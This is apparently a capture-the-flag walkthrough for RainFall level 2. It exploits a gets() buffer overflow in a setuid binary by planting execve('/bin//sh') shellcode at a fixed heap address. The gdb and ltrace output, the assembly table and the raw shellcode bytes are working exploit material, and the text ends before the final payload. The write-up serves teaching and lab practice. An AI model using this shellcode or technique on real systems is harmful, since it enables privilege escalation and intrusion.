# Level 2

## Vulnerability

Buffer overflow

## Context

We find a binary with owner ```level3``` and suid set.
```
level2@RainFall:~$ ls -l
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

## Solution

Running the binary, it seems to read from stdin, and print what is given.
```
level2@RainFall:~$ ./level2
oh hi
oh hi
```
We get some weird output with longer input, then after a certain length it segfaults.
```
level2@RainFall:~$ ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaa
level2@RainFall:~$ ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaaaaa
Segmentation fault (core dumped)
```
When we inspect with gdb we find main calls function ```p```. Function ```p``` includes a call to ```gets()``` which is vulnerable to buffer overflow.
```
level2@RainFall:~$ gdb -q level2
...
(gdb) disas main
...
   0x08048545 <+6>:	call   0x80484d4 <p>
...
(gdb) disas p
...
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
...
```
However, this buffer is stored on the stack, unfortunately function ```p``` checks to make sure the return address isn't in the stack.
```
(gdb) disas p
...
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
...
```
This prevents us from overwriting the return address with and address in the stack, or an environment variable.

However, we could use the heap. ltrace shows the buffer is later copied with strdup. strdup uses malloc which uses the heap.
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                          = 0
gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5 oh hi!
)               = 0xbffff6ac
puts(" oh hi!" oh hi!
)                                             = 8
strdup(" oh hi!")                                           = 0x0804a008
+++ exited (status 8) +++
```
ltrace also shows us strdup always uses the address ```0x804a008```, this indicates no ASLR (Address Space Layout Randomization).

So let's try to write our malicious shellcode in the heap by writing it in the input prompt. Then write the strdup malloc address on the return address.

Our malicious shellcode simply needs to open a new shell. We find the unix syscall for execve is 11.
```
level2@RainFall:~$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "execve"
#define __NR_execve		 11
```
Let's create the assembly code to do this, and break it down into bytecode.
```
+----------------+-----------------------+-----------------------+----------------------------------------------+
| Bytecode       | (Intermediate)        | Assembly              | Comments                                     |
+----------------+-----------------------+-----------------------+----------------------------------------------+
| 31 d2          | xor    edx,edx        | xor   edx, edx        | execve 3rd parameter = envp, NULL            |
| 31 c9          | xor    ecx,ecx        | xor   ecx, ecx        | execve 2nd parameter = argv, NULL            |
| 51             | push   ecx            | push  ecx             |                                              |
| 68 2f 2f 73 68 | push   0x68732f2f     | push  '//sh'          | after 3rd push instruction, stack contains:  |
| 68 2f 62 69 6e | push   0x6e69622f     | push  '/bin'          | db '/bin//sh',0,0,0,0                        |
| 31 c0          | xor    eax,eax        | xor   eax, eax        |                                              |
| b0 0b          | mov    al,0xb         | mov   al, 11          | execve syscall number from unistd            |
| 89 e3          | mov    ebx,esp        | mov   ebx, esp        | execve 1st parameter = executable (on stack) |
| 83 e4 f0       | and    esp,0xfffffff0 | and   esp, 0xfffffff0 | align stack                                  |
| cd 80          | int    0x80           | int   0x80            | syscall                                      |
+----------------+-----------------------+-----------------------+----------------------------------------------+
```
For ease lets's use python to echo our shell code, adding backslash ```\x```
```
\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80
```


